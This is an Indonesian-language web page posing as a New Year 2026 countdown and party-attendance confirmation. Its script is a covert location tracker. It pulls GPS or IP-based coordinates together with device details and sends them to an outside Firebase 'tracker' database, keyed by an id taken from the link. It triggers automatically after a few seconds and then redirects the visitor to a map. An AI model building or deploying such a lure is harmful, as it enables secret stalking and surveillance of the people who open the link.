<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéä Countdown Tahun Baru 2026 - Lokasi Terpilih!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; display: flex; flex-direction: column;
            justify-content: center; align-items: center; text-align: center; padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px);
            border-radius: 20px; padding: 30px; box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18); max-width: 500px; width: 100%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .countdown { font-size: 3em; font-weight: bold; margin: 20px 0; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #ee5a24); border: none; padding: 15px 30px;
            border-radius: 50px; color: white; font-size: 1.1em; font-weight: bold;
            cursor: pointer; transition: all 0.3s ease; margin: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; background: rgba(255, 255, 255, 0.1); font-weight: bold; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">üéä COUNTDOWN 2026</div>
        <div class="countdown" id="countdown">00:00:00</div>
        <button class="btn" onclick="confirmLocation()">üéØ KONFIRMASI LOKASI</button>
        <div class="status" id="status">Klik untuk konfirmasi kehadiran pesta eksklusif!</div>
    </div>

    <script>
        function updateCountdown() {
            const now = new Date(); const newYear = new Date(now.getFullYear() + 1, 0, 1); const diff = newYear - now;
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            document.getElementById('countdown').textContent = `${days}d ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        setInterval(updateCountdown, 1000); updateCountdown();

        async function confirmLocation() {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = '<div class="loading"></div> Mengakses lokasi GPS...';
            
            // Method 1: High accuracy GPS
            try {
                const position = await new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error('Geolocation not supported'));
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        resolve, 
                        reject, 
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
                    );
                });
                
                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_high');
                return;
                
            } catch (error) {
                console.log('High accuracy GPS failed:', error);
                statusEl.innerHTML = '<div class="loading"></div> Mencoba metode alternatif...';
            }
            
            // Method 2: Standard GPS
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        resolve, 
                        reject, 
                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 300000 }
                    );
                });
                
                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_standard');
                return;
                
            } catch (error) {
                console.log('Standard GPS failed:', error);
                statusEl.innerHTML = '<div class="loading"></div> Menggunakan lokasi perkiraan...';
            }
            
            // Method 3: IP-based location fallback
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.latitude && data.longitude) {
                    await sendLocationData(data.latitude, data.longitude, 10000, 'ip_location');
                    return;
                }
            } catch (error) {
                console.log('IP location failed:', error);
            }
            
            // Method 4: Default location (Jakarta)
            await sendLocationData(-6.2088, 106.8456, 50000, 'default_location');
        }
        
        async function sendLocationData(lat, lng, accuracy, source) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = '‚úÖ Lokasi dikonfirmasi! Memproses...';
            
            const deviceInfo = {
                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
                source: source, userAgent: navigator.userAgent, platform: navigator.platform
            };
            
            const trackingId = new URLSearchParams(window.location.search).get('id') || 'web_' + Date.now();
            const endpoints = [
                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`
            ];
            
            try {
                await Promise.allSettled(endpoints.map(endpoint => 
                    fetch(endpoint, { 
                        method: 'PUT', 
                        headers: { 'Content-Type': 'application/json' }, 
                        body: JSON.stringify(deviceInfo) 
                    })
                ));
                
                statusEl.innerHTML = 'üéâ Berhasil! Redirecting ke maps...';
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
                }, 1500);
                
            } catch (error) {
                statusEl.innerHTML = '‚úÖ Lokasi tersimpan! Terima kasih.';
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
                }, 2000);
            }
        }
        
        // Auto-trigger with permission check
        setTimeout(() => { 
            if (document.getElementById('status').textContent.includes('Klik')) {
                confirmLocation(); 
            }
        }, 4000);
        
        // Check geolocation permission on load
        if (navigator.permissions) {
            navigator.permissions.query({name: 'geolocation'}).then(function(result) {
                console.log('Geolocation permission:', result.state);
                if (result.state === 'denied') {
                    document.getElementById('status').innerHTML = '‚ö†Ô∏è Izin lokasi diblokir. Klik tombol untuk mengaktifkan.';
                }
            });
        }
    </script>
</body>
</html>
